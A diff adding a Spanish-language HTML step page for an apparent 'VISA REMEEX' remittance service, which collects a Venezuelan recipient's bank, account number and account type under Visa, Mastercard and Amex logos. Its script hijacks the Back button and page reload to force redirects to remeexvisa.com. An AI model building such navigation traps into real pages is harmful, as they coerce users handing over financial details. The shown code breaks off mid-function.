@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>VISA REMEEX Premium - Página 3</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Página 3 de VISA REMEEX Premium. Datos Bancarios del Beneficiario Receptor." />
+
+  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />
+  
+  <!-- Fuentes y Iconos -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
+
+  <!-- Librerías adicionales -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.3/html2pdf.bundle.min.js"></script>
+  
+  <!-- Estilos CSS -->
+  <style>
+    :root {
+      /* Colores modernos inspirados en Visa */
+      --primary: #1a1f71; /* Azul oscuro de Visa */
+      --primary-dark: #0d153e; /* Azul aún más oscuro */
+      --secondary: #3b82f6;
+      --accent: #60a5fa;
+      --success: #22c55e;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+
+      /* Colores para la animación del borde */
+      --border-white: #ffffff;
+      --border-gray: #d1d5db; /* Gris claro */
+      --border-light-blue: #93c5fd; /* Azul claro */
+
+      /* Fondos y texto */
+      --background: #f8fafc;
+      --card-bg: rgba(255, 255, 255, 0.98);
+      --text-primary: #0f172a;
+      --text-secondary: #475569;
+
+      /* Diseño */
+      --border-radius-xl: 28px;
+      --border-radius-lg: 24px;
+      --border-radius: 16px;
+      --border-radius-sm: 12px;
+      
+      /* Efectos */
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
+      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3), 0 6px 6px rgba(0, 0, 0, 0.2);
+      --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
+
+      /* Aurora Gradient */
+      --aurora-gradient: linear-gradient(120deg, rgba(26, 31, 113, 0.4), rgba(25, 35, 102, 0.3), rgba(30, 40, 120, 0.3), rgba(26, 31, 113, 0.2));
+      background-size: 400% 400%;
+    }
+
+    /* Reseteo y estilos básicos */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+      font-family: 'Inter', sans-serif;
+      color: var(--text-primary);
+      line-height: 1.6;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start; /* Alinea el contenido hacia arriba */
+      padding: 1rem;
+      overflow-x: hidden;
+    }
+
+    /* Contenedor principal con diseño de glassmorphism y glow intensificado */
+    .container {
+      max-width: 650px;
+      width: 100%;
+      margin-top: 2rem; /* Ajusta la distancia desde el top */
+      background: var(--card-bg);
+      border-radius: var(--border-radius-xl);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+      border: 2px solid var(--border-white); /* Reducir el grosor del borde a 2px */
+      overflow: hidden;
+      position: relative;
+      transition: var(--transition);
+      animation: glow 6s ease infinite, border-blink 6s linear infinite; /* Ajustar la duración de la animación del borde */
+    }
+
+    /* Animación existente para el glow */
+    @keyframes glow {
+      0%, 100% {
+        box-shadow: 0 0 30px rgba(26, 31, 113, 0.4), 0 0 60px rgba(26, 31, 113, 0.2);
+      }
+      50% {
+        box-shadow: 0 0 50px rgba(26, 31, 113, 0.6), 0 0 80px rgba(26, 31, 113, 0.4);
+      }
+    }
+
+    /* Nueva animación para el borde que alterna entre blanco, gris y azul claro */
+    @keyframes border-blink {
+      0% {
+        border-color: var(--border-white);
+      }
+      33% {
+        border-color: var(--border-gray);
+      }
+      66% {
+        border-color: var(--border-light-blue);
+      }
+      100% {
+        border-color: var(--border-white);
+      }
+    }
+
+    .container:hover {
+      transform: translateY(-5px);
+      box-shadow: var(--shadow-lg);
+    }
+
+    /* Header con gradiente moderno y auroras animadas en tonos azules más oscuros */
+    .header {
+      text-align: center;
+      background: linear-gradient(135deg, var(--primary-dark), var(--primary)); /* Fondo azul más oscuro */
+      color: #fff;
+      padding: 3rem 2rem;
+      position: relative;
+      overflow: hidden;
+      border-top-left-radius: var(--border-radius-xl);
+      border-top-right-radius: var(--border-radius-xl);
+      /* Aurora effect */
+      background-image: var(--aurora-gradient);
+      animation: aurora-animation 15s ease infinite;
+    }
+
+    /* Destello de luz en la tarjeta superior del logo de REMEEX */
+    .header::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -150%;
+      width: 50%;
+      height: 100%;
+      background: linear-gradient(120deg, transparent, rgba(255,255,255,0.8), transparent);
+      transform: skewX(-25deg);
+      opacity: 0;
+      pointer-events: none;
+      animation: flash 3s ease-in-out infinite;
+    }
+
+    @keyframes flash {
+      0% {
+        left: -150%;
+        opacity: 0;
+      }
+      40% {
+        opacity: 0;
+      }
+      50% {
+        left: 50%;
+        opacity: 0.8;
+      }
+      60% {
+        opacity: 0;
+      }
+      100% {
+        left: 150%;
+        opacity: 0;
+      }
+    }
+
+    @keyframes aurora-animation {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+
+    .header-logo {
+      width: 80%; /* Ajusta el tamaño según sea necesario */
+      max-width: 400px;
+      height: auto;
+      margin-bottom: 1rem;
+    }
+
+    .header p {
+      font-size: 1.2rem;
+      line-height: 1.6;
+      max-width: 600px;
+      margin: 0 auto;
+      opacity: 0.95;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* Logo Bar con animaciones suaves */
+    .logo-bar {
+      background: var(--card-bg);
+      padding: 1.5rem 1rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 3rem;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .logo-bar::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 200%;
+      height: 100%;
+      background: linear-gradient(120deg, rgba(255,255,255,0.1), rgba(255,255,255,0.2), rgba(255,255,255,0.1));
+      animation: shimmer 3s linear infinite;
+    }
+
+    @keyframes shimmer {
+      0% {
+        transform: translateX(-50%);
+      }
+      100% {
+        transform: translateX(50%);
+      }
+    }
+
+    .logo-bar img {
+      height: 36px;
+      filter: grayscale(20%);
+      opacity: 0.9;
+      transition: var(--transition);
+      position: relative;
+      z-index: 2;
+    }
+
+    .logo-bar img:hover {
+      filter: none;
+      opacity: 1;
+      transform: scale(1.08);
+    }
+
+    /* Barra de progreso moderna con animación y mayor grosor */
+    .progress-bar {
+      height: 16px; /* Aumentar la altura de la barra */
+      background-color: #e2e8f0;
+      border-radius: var(--border-radius);
+      margin: 2rem;
+      overflow: hidden;
+      position: relative;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      width: 0%;
+      transition: width 0.6s ease-in-out;
+      border-radius: var(--border-radius);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -50%;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: skewX(-45deg);
+      animation: move 2s linear infinite;
+    }
+
+    @keyframes move {
+      0% {
+        left: -50%;
+      }
+      100% {
+        left: 100%;
+      }
+    }
+
+    /* Secciones con transiciones suaves */
+    .section-content {
+      padding: 2rem;
+      opacity: 0;
+      transform: translateY(10px);
+      transition: all 0.4s ease-out;
+      display: none;
+    }
+
+    .section-content.active {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .section-content h2 {
+      margin-bottom: 1.5rem;
+      font-size: 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      color: var(--primary);
+    }
+
+    .section-content h2 i {
+      color: var(--primary);
+      font-size: 1.3rem;
+    }
+
+    /* Campos de formulario modernos */
+    .form-group {
+      margin-bottom: 1.75rem;
+    }
+
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 0.875rem 1.25rem;
+      border: 2px solid #e2e8f0;
+      border-radius: var(--border-radius);
+      font-size: 1rem;
+      background: #fff;
+      transition: var(--transition);
+      color: var(--text-primary);
+    }
+
+    .form-control:hover {
+      border-color: #cbd5e1;
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.2);
+    }
+
+    /* Botón moderno con efecto glow */
+    .btn-container {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 1.5rem;
+      position: relative;
+      width: 220px; /* Ajustado para ser levemente más pequeño */
+      height: 55px; /* Ajustado para ser levemente más pequeño */
+    }
+
+    .btn-glow-effect {
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(
+        90deg, 
+        transparent, 
+        var(--primary), 
+        var(--secondary), 
+        transparent
+      );
+      background-size: 200% 100%;
+      border-radius: 30px;
+      animation: border-glow 3s ease infinite;
+      filter: blur(8px); /* Reducido de 10px a 8px para evitar superposición */
+      opacity: 0.7;
+      z-index: 0;
+    }
+
+    @keyframes border-glow {
+      0% {
+        background-position: -100% 0;
+      }
+      50% {
+        background-position: 100% 0;
+      }
+      100% {
+        background-position: -100% 0;
+      }
+    }
+
+    .btn-glow {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      overflow: hidden;
+      box-shadow: 
+          0 15px 25px rgba(0,0,0,0.3), 
+          inset 0 -4px 8px rgba(255,255,255,0.3);
+      transition: all 0.3s ease;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 1rem;
+    }
+
+    .btn-glow-content {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+    }
+
+    .btn-glow-initial {
+      opacity: 1;
+      transform: translateX(0);
+    }
+
+    .btn-glow:hover .btn-glow-initial {
+      opacity: 0;
+      transform: translateX(-100%); /* Movimiento hacia la izquierda */
+    }
+
+    .btn-glow-hover {
+      position: absolute;
+      top: 0;
+      left: 100%; /* Inicialmente fuera de la vista a la derecha */
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0; /* Inicialmente oculto */
+      transform: translateX(0);
+      color: white;
+    }
+
+    .btn-glow:hover .btn-glow-hover {
+      opacity: 1;
+      left: 0; /* Mover al centro */
+      transform: translateX(0);
+    }
+
+    .btn-glow-icon {
+      margin-left: 10px;
+    }
+
+    /* Modal de Resumen con Glassmorphism y Diseño Moderno */
+    .modal-overlay {
+      backdrop-filter: blur(8px);
+      background: rgba(0,0,0,0.2);
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .modal-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .modal-content {
+      transform: translateY(20px);
+      opacity: 0;
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      background: rgba(255, 255, 255, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      box-shadow: 
+        0 10px 30px rgba(0,0,0,0.1),
+        0 1px 8px rgba(0,0,0,0.2);
+      max-width: 550px;
+      padding: 2.5rem;
+      border-radius: var(--border-radius-lg);
+      backdrop-filter: blur(10px);
+    }
+
+    .modal-overlay.active .modal-content {
+      transform: translateY(0);
+      opacity: 1;
+    }
+
+    /* Nueva sección para el resumen con logo */
+    .summary-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 1.5rem;
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+
+    .spinner-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .bank-logo {
+      width: 120px; /* Aumentar el tamaño del logo */
+      height: auto;
+      border-radius: 8px;
+      transition: transform 0.3s ease;
+    }
+
+    .bank-logo:hover {
+      transform: scale(1.05);
+    }
+
+    .modal-content h3 {
+      color: var(--primary);
+      font-size: 1.5rem;
+      font-weight: 600;
+      text-align: center;
+      margin-bottom: 2rem;
+      padding-bottom: 1rem;
+      border-bottom: 2px solid rgba(26, 31, 113, 0.1);
+    }
+
+    .modal-content p {
+      background: rgba(26, 31, 113, 0.03);
+      padding: 1.5rem;
+      border-radius: var(--border-radius);
+      margin-bottom: 1.5rem;
+      line-height: 1.8;
+      color: var(--text-primary);
+    }
+
+    .modal-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 1.5rem;
+      margin-top: 2rem;
+      flex-wrap: wrap; /* Permite que los botones se ajusten en pantallas pequeñas */
+    }
+
+    .modal-buttons .btn-glow {
+      width: 120px;
+      height: 45px;
+      font-size: 0.9rem;
+    }
+
+    .countdown {
+      text-align: center;
+      display: block;
+      margin-top: 1.5rem;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+      font-weight: 500;
+    }
+
+    /* Media queries para responsive */
+    @media (max-width: 768px) {
+      .container {
+        margin-top: 1.5rem;
+      }
+
+      .header {
+        padding: 2rem 1rem;
+      }
+
+      .header-logo {
+        width: 70%;
+        max-width: 300px;
+      }
+
+      .header p {
+        font-size: 1rem;
+      }
+
+      .logo-bar {
+        gap: 2rem;
+        padding: 1rem;
+      }
+
+      .logo-bar img {
+        height: 28px;
+      }
+
+      .progress-bar {
+        height: 14px;
+      }
+
+      .section-content {
+        padding: 1.5rem;
+      }
+
+      .btn-container {
+        width: 180px; 
+        height: 50px; 
+      }
+
+      .modal-buttons .btn-glow {
+        width: 100px;
+        height: 40px;
+        font-size: 0.85rem;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .header-logo {
+        width: 90%;
+        max-width: 250px;
+      }
+
+      .header p {
+        font-size: 0.95rem;
+      }
+
+      .logo-bar {
+        gap: 1.5rem;
+      }
+
+      .logo-bar img {
+        height: 24px;
+      }
+
+      .progress-bar {
+        height: 12px;
+      }
+
+      .btn-container {
+        width: 150px;
+        height: 45px;
+      }
+
+      .btn-glow {
+        font-size: 0.9rem;
+      }
+
+      .modal-buttons .btn-glow {
+        width: 80px;
+        height: 35px;
+        font-size: 0.8rem;
+      }
+
+      .summary-header {
+        flex-direction: column;
+        align-items: center;
+        gap: 1rem;
+      }
+
+      .bank-logo {
+        width: 60px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <!-- Header -->
+    <div class="header">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnBzNdjl6bNp-nIdaiHVENczJhwlJNA7ocsyiOObMmzbu8at0dY5yGcZ9cLxLF39qI6gwNfqBxlkTDC0txVULEwQVwGkeEzN0Jq9MRTRagA48mh18UqTlR4WhsXOLAEZugUyhqJHB19xJgnkpe-S5VOWFgzpKFwctv3XP9XhH41vNTvq0ZS-nik58Qhr-O/s320/remeex.png" alt="REMEEX Logo" class="header-logo">
+      <p>
+        Envía dinero al instante sin comisiones
+      </p>
+    </div>
+
+    <!-- Barra de Logos -->
+    <div class="logo-bar">
+      <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
+      <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
+      <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
+    </div>
+
+    <!-- Barra de Progreso -->
+    <div class="progress-bar">
+      <div class="progress-bar-fill" id="progressBarFill"></div>
+    </div>
+
+    <!-- Contenido de la Sección -->
+    <div class="section-content active" id="step1">
+      <h2><i class="fas fa-university"></i> Datos Bancarios del Beneficiario Receptor</h2>
+      <div class="form-group">
+        <label class="form-label" for="bankSelect">Banco</label>
+        <select class="form-control" id="bankSelect">
+          <option value="">-- Selecciona un banco --</option>
+          <option value="Banco Central de Venezuela">Banco Central de Venezuela</option>
+          <option value="Banco de Venezuela, S.A.">Banco de Venezuela, S.A.</option>
+          <option value="Banco Venezolano de Crédito, S.A.">Banco Venezolano de Crédito, S.A.</option>
+          <option value="Banco Mercantil, C.A.">Banco Mercantil, C.A.</option>
+          <option value="Banco Provincial, S.A.">Banco Provincial, S.A.</option>
+          <option value="Banco del Caribe C.A., Bancaribe">Banco del Caribe C.A., Bancaribe</option>
+          <option value="Banco Exterior C.A., Banco Universal">Banco Exterior C.A., Banco Universal</option>
+          <option value="Banco Caroní C.A., Banco Universal">Banco Caroní C.A., Banco Universal</option>
+          <option value="Banesco Banco Universal, C.A.">Banesco Banco Universal, C.A.</option>
+          <option value="Banco Sofitasa Banco Universal, C.A.">Banco Sofitasa Banco Universal, C.A.</option>
+          <option value="Banco Plaza, Banco Universal">Banco Plaza, Banco Universal</option>
+          <option value="Banco de la Gente Emprendedora C.A.">Banco de la Gente Emprendedora C.A.</option>
+          <option value="Banco Fondo Común, C.A.">Banco Fondo Común, C.A.</option>
+          <option value="100% Banco, Banco Comercial, C.A.">100% Banco, Banco Comercial, C.A.</option>
+          <option value="DelSur, Banco Universal C.A.">DelSur, Banco Universal C.A.</option>
+          <option value="Banco del Tesoro C.A., Banco Universal">Banco del Tesoro C.A., Banco Universal</option>
+          <option value="Banco Agrícola de Venezuela C.A., Banco Universal">Banco Agrícola de Venezuela C.A., Banco Universal</option>
+          <option value="Bancrecer S.A., Banco Microfinanciero">Bancrecer S.A., Banco Microfinanciero</option>
+          <option value="Mi Banco, Banco Microfinanciero, C.A.">Mi Banco, Banco Microfinanciero, C.A.</option>
+          <option value="Banco Activo C.A., Banco Universal">Banco Activo C.A., Banco Universal</option>
+          <option value="Bancamiga Banco Universal, C.A.">Bancamiga Banco Universal, C.A.</option>
+          <option value="Banco Internacional de Desarrollo C.A., Banco Universal">Banco Internacional de Desarrollo C.A., Banco Universal</option>
+          <option value="Banplus Banco Universal, C.A.">Banplus Banco Universal, C.A.</option>
+          <option value="Banco Bicentenario del Pueblo, Banco Universal C.A.">Banco Bicentenario del Pueblo, Banco Universal C.A.</option>
+          <option value="Banco de la Fuerza Armada Nacional Bolivariana, B.U.">Banco de la Fuerza Armada Nacional Bolivariana, B.U.</option>
+          <option value="Banco Nacional de Crédito C.A., Banco Universal">Banco Nacional de Crédito C.A., Banco Universal</option>
+          <option value="Instituto Municipal de Crédito Popular">Instituto Municipal de Crédito Popular</option>
+        </select>
+      </div>
+
+      <div class="form-group" id="accountContainer" style="display:none;">
+        <label class="form-label" for="accountNumber">Número de cuenta</label>
+        <div style="display:flex; gap:0.5rem;">
+          <input type="text" class="form-control" id="bankCode" style="max-width:100px;" readonly />
+          <input type="text" class="form-control" id="restAccountDigits" placeholder="16 dígitos restantes" maxlength="16" />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="accountType">Tipo de cuenta</label>
+        <select class="form-control" id="accountType">
+          <option value="">-- Selecciona --</option>
+          <option value="Ahorro (Bs)">Ahorro (Bs)</option>
+          <option value="Corriente (Bs)">Corriente (Bs)</option>
+          <option value="Divisa Dólares (USD)">Divisa Dólares (USD)</option>
+          <option value="Divisa Euros (EUR)">Divisa Euros (EUR)</option>
+        </select>
+      </div>
+
+      <!-- Botón con efecto glow -->
+      <div class="btn-container">
+        <div class="btn-glow-effect"></div>
+        <button class="btn-glow" id="continueBtnStep1">
+          <div class="btn-glow-content btn-glow-initial">
+            Continuar
+          </div>
+          <div class="btn-glow-content btn-glow-hover">
+            Continuar
+            <svg class="btn-glow-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12"></line>
+              <polyline points="12 5 19 12 12 19"></polyline>
+            </svg>
+          </div>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal de Resumen -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal-content">
+      <!-- Nueva sección para el resumen con logo -->
+      <div class="summary-header">
+        <div class="spinner-container">
+          <div class="spinner">
+            <div class="spinner-bar"></div>
+            <div class="spinner-bar"></div>
+            <div class="spinner-bar"></div>
+          </div>
+        </div>
+        <img src="" alt="Bank Logo" id="bankLogo" class="bank-logo" style="display:none;">
+      </div>
+      <h3>Resumen de datos bancarios</h3>
+      <p id="summaryText"></p>
+      <div class="modal-buttons">
+        <button class="btn-glow" id="editBtn">Editar</button>
+        <button class="btn-glow" id="acceptBtn" disabled>Aceptar</button>
+      </div>
+      <span class="countdown" id="countdownMsg">Disponible en 10s</span>
+    </div>
+  </div>
+
+  <!-- Scripts JavaScript -->
+  <script>
+    let isRedirecting = false; // Bandera para indicar redirección
+
+    // Redirigir si el usuario presiona Atrás:
+    history.pushState({}, '', '');
+    window.addEventListener('popstate', function(event) {
+      window.location.href = "https://remeexvisa.com";
+    });
+
+    // Redirigir si el usuario recarga la página:
+    window.addEventListener('beforeunload', function(e) {
+      if (!isRedirecting) { // Solo redirigir si no es una redirección intencional
+        e.preventDefault();
+        window.location.href = "https://remeexvisa.com";
+        e.returnValue = '';
+      }
+    });
+
+    const bankSelect = document.getElementById("bankSelect");
+    const accountContainer = document.getElementById("accountContainer");
+    const bankCodeInput = document.getElementById("bankCode");
+    const restAccountDigitsInput = document.getElementById("restAccountDigits");
+    const accountTypeSelect = document.getElementById("accountType");
+    const continueBtnStep1 = document.getElementById("continueBtnStep1");
+    const progressBarFill = document.getElementById("progressBarFill");
+    const modalOverlay = document.getElementById("modalOverlay");
+    const summaryText = document.getElementById("summaryText");
+    const editBtn = document.getElementById("editBtn");
+    const acceptBtn = document.getElementById("acceptBtn");
+    const countdownMsg = document.getElementById("countdownMsg");
+    const bankLogo = document.getElementById("bankLogo");
+
+    let selectedOptions = {
+      bank: false,
+      accountNumber: false,
+      accountType: false
+    };
+
+    let countdownInterval;
+    let secondsLeft = 10;
+
+    // Mapeo de nombres de bancos a sus 4 dígitos iniciales
+    const bankMapping = {
+      "Banco Central de Venezuela": "0001",
+      "Banco de Venezuela, S.A.": "0102",
+      "Banco Venezolano de Crédito, S.A.": "0104",
+      "Banco Mercantil, C.A.": "0105",
+      "Banco Provincial, S.A.": "0108",
+      "Banco del Caribe C.A., Bancaribe": "0114",
+      "Banco Exterior C.A., Banco Universal": "0115",
+      "Banco Caroní C.A., Banco Universal": "0128",
+      "Banesco Banco Universal, C.A.": "0134",
+      "Banco Sofitasa Banco Universal, C.A.": "0137",
+      "Banco Plaza, Banco Universal": "0138",
+      "Banco de la Gente Emprendedora C.A.": "0146",
+      "Banco Fondo Común, C.A.": "0151",
+      "100% Banco, Banco Comercial, C.A.": "0156",
+      "DelSur, Banco Universal C.A.": "0157",
+      "Banco del Tesoro C.A., Banco Universal": "0163",
+      "Banco Agrícola de Venezuela C.A., Banco Universal": "0166",
+      "Bancrecer S.A., Banco Microfinanciero": "0168",
+      "Mi Banco, Banco Microfinanciero, C.A.": "0169",
+      "Banco Activo C.A., Banco Universal": "0171",
+      "Bancamiga Banco Universal, C.A.": "0172",
+      "Banco Internacional de Desarrollo C.A., Banco Universal": "0173",
+      "Banplus Banco Universal, C.A.": "0174",
+      "Banco Bicentenario del Pueblo, Banco Universal C.A.": "0175",
+      "Banco de la Fuerza Armada Nacional Bolivariana, B.U.": "0177",
+      "Banco Nacional de Crédito C.A., Banco Universal": "0191",
+      "Instituto Municipal de Crédito Popular": "0601"
+    };
+
+    // Mapeo de nombres de bancos a sus logotipos
+    const bankLogosMapping = {
+      "Banco de Venezuela, S.A.": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
+      "Banco Central de Venezuela": "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
+      "Banco Venezolano de Crédito, S.A.": "https://www.venezolano.com/images/galeria/108_1.png",
+      "Banco Mercantil, C.A.": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
+      "Banco Provincial, S.A.": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
+      "Banco del Caribe C.A., Bancaribe": "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
+      "Banco Exterior C.A., Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
+      "Banco Caroní C.A., Banco Universal": "https://www.bancocaroni.com.ve/wp-content/uploads/elementor/thumbs/Logo-252-x-48-1-qvqyrv33uw6afqa09bf5f2tswrzr0yaos9y59b3tuo.png",
+      "Banesco Banco Universal, C.A.": "https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip",
+      "Banco Sofitasa Banco Universal, C.A.": "https://www.sofitasa.com/assets/img/nuevo_logo.png",
+      "Banco Plaza, Banco Universal": "https://plazacdn.s3.amazonaws.com/wp-content/themes/bancoplaza/imagenes/logobancoplaza-2.png",
+      "Banco Fondo Común, C.A.": "https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png",
+      "100% Banco, Banco Comercial, C.A.": "https://www.100x100banco.com/img/logo.png",
+      "Banco del Tesoro C.A., Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Logo_Banco_del_Tesoro.jpg/320px-Logo_Banco_del_Tesoro.jpg",
+      "Bancrecer S.A., Banco Microfinanciero": "https://www.bancrecer.com.ve/images/img/bancrecer-logo.png",
+      "Banco Activo C.A., Banco Universal": "https://www.bancoactivo.com/logo.svg",
+      "Bancamiga Banco Universal, C.A.": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png",
+      "Banplus Banco Universal, C.A.": "https://www.banplus.com/uploads/contenidos/logo_banplus2023.jpg",
+      "Banco Bicentenario del Pueblo, Banco Universal C.A.": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png",
+      "Banco Nacional de Crédito C.A., Banco Universal": "https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png"
+    };
+
+    // Event Listener para seleccionar banco
+    bankSelect.addEventListener("change", () => {
+      const selectedBank = bankSelect.value;
+      if (selectedBank) {
+        selectedOptions.bank = true;
+        const code = bankMapping[selectedBank];
+        bankCodeInput.value = code || "0000";
+        accountContainer.style.display = "flex";
+      } else {
+        selectedOptions.bank = false;
+        bankCodeInput.value = "";
+        accountContainer.style.display = "none";
+      }
+      restAccountDigitsInput.value = "";
+      selectedOptions.accountNumber = false;
+      updateProgressBar();
+      guardarDatosAutomaticamente();
+    });
+
+    // Event Listener para ingresar los dígitos restantes de la cuenta
+    restAccountDigitsInput.addEventListener("input", () => {
+      selectedOptions.accountNumber = restAccountDigitsInput.value.length === 16;
+      updateProgressBar();
+      guardarDatosAutomaticamente();
+    });
+
+    // Event Listener para seleccionar tipo de cuenta
+    accountTypeSelect.addEventListener("change", () => {
+      selectedOptions.accountType = !!accountTypeSelect.value;
+      updateProgressBar();
+      guardarDatosAutomaticamente();
+    });
+
+    // Event Listener para el botón Continuar
+    continueBtnStep1.addEventListener("click", () => {
+      if (validateStep1()) {
+        showSummary();
+      }
+    });
+
+    // Event Listener para el botón Editar en el modal
+    editBtn.addEventListener("click", () => {
+      closeModal();
+    });
+
+    // Event Listener para el botón Aceptar en el modal
+    acceptBtn.addEventListener("click", () => {
+      if (validateSummary()) {
+        isRedirecting = true;
+        continueRemeexVisa();
+      }
+    });
+
+    // Función para actualizar la barra de progreso
+    function updateProgressBar() {
+      let completedSteps = 0;
+      for (const option in selectedOptions) {
+        if (selectedOptions[option]) {
+          completedSteps++;
+        }
+      }
+      const progressPercentage = (completedSteps / 3) * 100;
+      progressBarFill.style.width = `${progressPercentage}%`;
+    }
+
+    // Función para mostrar el resumen en el modal
+    function showSummary() {
+      const fullBankName = bankSelect.value;
+      const fullAccountNumber = bankCodeInput.value + restAccountDigitsInput.value;
+
+      let resumen = `
+        <strong>Banco:</strong> ${fullBankName}<br/>
+        <strong>Número de Cuenta:</strong> ${fullAccountNumber}<br/>
+        <strong>Tipo de Cuenta:</strong> ${accountTypeSelect.value}<br/>
+      `;
+
+      summaryText.innerHTML = resumen;
+
+      // Configurar el logotipo del banco
+      const logoUrl = bankLogosMapping[fullBankName];
+      if (logoUrl) {
+        bankLogo.src = logoUrl;
+        bankLogo.style.display = "block";
+      } else {
+        bankLogo.style.display = "none";
+      }
+
+      openModal();
+    }
+
+    // Función para abrir el modal
+    function openModal() {
+      modalOverlay.classList.add("active");
+
+      clearInterval(countdownInterval);
+      secondsLeft = 10;
